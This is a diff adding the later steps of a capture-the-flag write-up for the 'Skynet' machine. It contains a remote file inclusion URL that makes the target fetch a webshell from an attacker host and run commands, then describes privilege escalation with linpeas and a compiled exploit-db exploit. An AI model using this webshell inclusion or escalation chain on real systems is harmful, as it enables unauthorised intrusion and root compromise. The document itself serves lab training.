@@ -80,3 +80,16 @@ By reading the exploit I understood if I host a webshell in my attacker machine,
 http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:<attacker_port>/shell.txt&cmd=ls
 ```
 
+It showed me the result of ls command: Now I ran some commands to find the directories and all that stuff. Then I set cmd in url as `cat /home/milesdyson/user.txt` and it gave me the flag:
+
+![Alt text](../Screenshots/Skynet/user_flag.png)
+
+Now we need to escalate our privileges. First thing I done is I ran the linpeas on the target machine and found come known cve's. The first I tried was:
+
+![Alt text](../Screenshots/Skynet/exploit_name.png)
+
+I Downloaded it's exploit from exploit-db, transferred it to the target machine. Compiled it and ran it, Boom! we go the root shell:
+
+![Alt text](../Screenshots/Skynet/root_shell.png)
+
+Now, you can read the root flag from `/root/root.txt`.
